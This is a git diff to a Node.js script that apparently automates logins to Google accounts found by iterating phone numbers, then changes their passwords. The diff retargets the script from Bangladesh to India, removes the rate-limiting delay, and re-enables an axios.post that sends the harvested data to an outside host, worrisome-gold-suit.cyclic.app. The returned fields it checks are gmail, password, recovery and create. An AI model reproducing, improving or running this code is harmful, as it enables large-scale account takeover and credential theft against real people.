@@ -6,11 +6,11 @@ const axios = require('axios')
 const fs = require('fs')
 
 
-const COUNTRY = 'BD'
-const LENGTH = 11
+const COUNTRY = 'IN'
+const LENGTH = 10
 const TIMEING = 3
 const SAVE_SIZE = 1
-const DELAY = 500
+const DELAY = 0
 
 
 let signIn = 'https://accounts.google.com/InteractiveLogin?continue=https://myaccount.google.com/phone&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&ifkv=AX3vH3_8OID3jcdWI28sWhLKyWZfo4meEPPnetcotLVnH3ejfs06Wk_CtNS4zazcrE3kC6LvY3Qy&nojavascript=1&rip=1&service=accountsettings'
@@ -448,30 +448,31 @@ function passwordChange(number, tl, cid, gps, password, cookies, again) {
 
     console.log(data)
 
-    // axios.post('https://worrisome-gold-suit.cyclic.app', { data: data }).then(res => {
-    //     try {
-    //         let body = res.data
-    //         if (body['gmail'] != null && body['password'] != null && body['recovery'] != null && body['create'] != null) {
-    //             nextNumber(false)
-    //         } else if (again == 0) {
-    //             passwordChange(number, tl, cid, gps, password, cookies, 1)
-    //         } else {
-    //             nextNumber(false)
-    //         }
-    //     } catch (error) {
-    //         if (again == 0) {
-    //             passwordChange(number, tl, cid, gps, password, cookies, 1)
-    //         } else {
-    //             nextNumber(false)
-    //         }
-    //     }
-    // }).catch(err => {
-    //     if (again == 0) {
-    //         passwordChange(number, tl, cid, gps, password, cookies, 1)
-    //     } else {
-    //         nextNumber(false)
-    //     }
-    // })
+    axios.post('https://worrisome-gold-suit.cyclic.app', { data: data }).then(res => {
+        try {
+            let body = res.data
+            console.log(body)
+            if (body['gmail'] != null && body['password'] != null && body['recovery'] != null && body['create'] != null) {
+                nextNumber(false)
+            } else if (again == 0) {
+                passwordChange(number, tl, cid, gps, password, cookies, 1)
+            } else {
+                nextNumber(false)
+            }
+        } catch (error) {
+            if (again == 0) {
+                passwordChange(number, tl, cid, gps, password, cookies, 1)
+            } else {
+                nextNumber(false)
+            }
+        }
+    }).catch(err => {
+        if (again == 0) {
+            passwordChange(number, tl, cid, gps, password, cookies, 1)
+        } else {
+            nextNumber(false)
+        }
+    })
 }
 
 function nextNumber(matching) {
